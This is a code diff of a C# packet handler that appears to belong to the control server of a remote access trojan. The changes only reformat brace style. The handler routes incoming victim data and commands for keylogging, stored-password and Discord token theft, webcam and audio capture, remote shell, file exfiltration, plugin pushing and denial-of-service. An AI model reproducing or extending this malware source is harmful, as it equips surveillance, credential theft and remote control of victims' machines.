@@ -8,67 +8,54 @@ using System.IO;
 using System.Diagnostics;
 using System;
 
-namespace Server.Handle_Packet
-{
-    public class Packet
-    {
+namespace Server.Handle_Packet {
+    public class Packet {
         public Clients client;
         public byte[] data;
 
-        public void Read(object o)
-        {
-            try
-            {
+        public void Read(object o) {
+            try {
                 MsgPack unpack_msgpack = new MsgPack();
                 unpack_msgpack.DecodeFromBytes(data);
-                Program.form1.Invoke((MethodInvoker)(() =>
-                {
-                    switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
-                    {
-                        case "ClientInfo":
-                            {
+                Program.form1.Invoke((MethodInvoker)(() => {
+                    switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString) {
+                        case "ClientInfo": {
                                 ThreadPool.QueueUserWorkItem(delegate {
                                     new HandleListView().AddToListview(client, unpack_msgpack);
                                 });
                                 break;
                             }
 
-                        case "Ping":
-                            {
+                        case "Ping": {
                                 new HandlePing().Ping(client, unpack_msgpack);
                                 client.LastPing = DateTime.Now;
                                 break;
                             }
 
-                        case "Po_ng":
-                            {
+                        case "Po_ng": {
                                 new HandlePing().Po_ng(client, unpack_msgpack);
                                 client.LastPing = DateTime.Now;
                                 break;
                             }
 
-                        case "Logs":
-                            {
+                        case "Logs": {
                                 new HandleLogs().Addmsg($"From {client.Ip} client: {unpack_msgpack.ForcePathObject("Message").AsString}", Color.Black);
                                 break;
                             }
 
-                        case "thumbnails":
-                            {
+                        case "thumbnails": {
                                 client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                                 new HandleThumbnails(client, unpack_msgpack);
                                 break;
                             }
 
-                        case "Received":
-                            {
+                        case "Received": {
                                 new HandleListView().Received(client);
                                 client.LastPing = DateTime.Now;
                                 break;
                             }
 
-                        case "Error":
-                            {
+                        case "Error": {
                                 new HandleLogs().Addmsg($"Error from {client.Ip} client: {unpack_msgpack.ForcePathObject("Error").AsString}", Color.Red);
                                 /*lock (Settings.LockListviewClients)
                                 {
@@ -76,70 +63,58 @@ namespace Server.Handle_Packet
                                 }*/
                                 break;
                             }
-                        case "remoteDesktop":
-                            {
+                        case "remoteDesktop": {
                                 new HandleRemoteDesktop().Capture(client, unpack_msgpack);
                                 break;
                             }
 
-                        case "processManager":
-                            {
+                        case "processManager": {
                                 new HandleProcessManager().GetProcess(client, unpack_msgpack);
                                 break;
                             }
 
-                        case "netstat":
-                            {
+                        case "netstat": {
                                 new HandleNetstat().GetProcess(client, unpack_msgpack);
                                 break;
                             }
 
-                        case "socketDownload":
-                            {
+                        case "socketDownload": {
                                 new HandleFileManager().SocketDownload(client, unpack_msgpack);
                                 break;
                             }
 
-                        case "keyLogger":
-                            {
+                        case "keyLogger": {
                                 new HandleKeylogger(client, unpack_msgpack);
                                 break;
                             }
 
-                        case "fileManager":
-                            {
+                        case "fileManager": {
                                 new HandleFileManager().FileManager(client, unpack_msgpack);
                                 break;
                             }
 
-                        case "shell":
-                            {
+                        case "shell": {
                                 new HandleShell(unpack_msgpack, client);
                                 break;
                             }
 
-                        case "chat":
-                            {
+                        case "chat": {
                                 new HandleChat().Read(unpack_msgpack, client);
                                 break;
                             }
 
-                        case "chat-":
-                            {
+                        case "chat-": {
                                 new HandleChat().GetClient(unpack_msgpack, client);
                                 break;
                             }
 
-                        case "reportWindow":
-                            {
+                        case "reportWindow": {
                                 new HandleReportWindow(client, unpack_msgpack.ForcePathObject("Report").AsString);
                                 break;
                             }
 
-                        case "reportWindow-":
-                            {
-                                if (Settings.ReportWindow == false)
-                                {
+                        case "reportWindow-": {
+                                if (Settings.ReportWindow == false) {
                                     MsgPack packet = new MsgPack();
                                     packet.ForcePathObject("Pac_ket").AsString = "reportWindow";
                                     packet.ForcePathObject("Option").AsString = "stop";
@@ -151,20 +126,17 @@ namespace Server.Handle_Packet
                                 break;
                             }
 
-                        case "webcam":
-                            {
+                        case "webcam": {
                                 new HandleWebcam(unpack_msgpack, client);
                                 break;
                             }
 
-                        case "dosAdd":
-                            {
+                        case "dosAdd": {
                                 new HandleDos().Add(client, unpack_msgpack);
                                 break;
                             }
 
-                        case "sendPlugin":
-                            {
+                        case "sendPlugin": {
                                 new HandleLogs().Addmsg($"Sending plugun to {client.Ip} ……", Color.Blue);
                                 ThreadPool.QueueUserWorkItem(delegate {
                                     client.SendPlugin(unpack_msgpack.ForcePathObject("Hashes").AsString);
@@ -172,53 +144,44 @@ namespace Server.Handle_Packet
                                 break;
                             }
 
-                        case "fileSearcher":
-                            {
+                        case "fileSearcher": {
                                 new HandleFileSearcher().SaveZipFile(client, unpack_msgpack);
                                 break;
                             }
-                        case "Information":
-                            {
+                        case "Information": {
                                 new HandleInformation().AddToInformationList(client, unpack_msgpack);
                                 break;
                             }
-                        case "Password":
-                            {
+                        case "Password": {
                                 new HandlePassword().SavePassword(client, unpack_msgpack);
                                 break;
                             }
-                        case "Audio":
-                            {
+                        case "Audio": {
                                 new HandleAudio().SaveAudio(client, unpack_msgpack);
                                 break;
                             }
-                        case "recoveryPassword":
-                            {
+                        case "recoveryPassword": {
                                 new HandleRecovery(client, unpack_msgpack);
                                 break;
                             }
-                        case "discordRecovery":
-                            {
+                        case "discordRecovery": {
                                 new HandleDiscordRecovery(client, unpack_msgpack);
                                 break;
                             }
 
-                        case "regManager":
-                            {
+                        case "regManager": {
                                 new HandleRegManager().RegManager(client, unpack_msgpack);
                                 break;
                             }
 
-                        case "fun":
-                            {
+                        case "fun": {
                                 new HandleFun().Fun(client, unpack_msgpack);
                                 break;
                             }
                     }
                 }));
             }
-            catch
-            {
+            catch {
                 return;
             }
         }
